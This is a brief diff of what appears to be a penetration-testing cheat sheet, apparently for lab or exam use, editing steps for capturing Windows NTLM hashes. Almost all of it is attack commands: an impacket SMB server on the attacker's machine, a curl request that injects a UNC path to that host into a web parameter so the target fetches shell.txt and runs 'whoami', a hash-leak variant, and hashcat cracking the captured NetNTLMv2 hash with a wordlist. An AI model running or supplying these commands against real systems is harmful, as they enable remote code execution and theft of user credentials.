@@ -71,7 +71,6 @@ Windows reaches an SMB share the same way, and sends its hash with it:
 sudo /opt/pwn-broker/bin/impacket-smbserver share "$(pwd)" -smb2support
 - [ ] The full path with sudo: a bare sudo impacket-smbserver does not use pwn-broker's bin folder
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\share\\shell.txt&cmd=whoami"
-Only the hash, with Responder in place of the share:
-sudo responder -I tun0
+Only the hash, with the same non-poisoning SMB listener:
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\nothing"
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
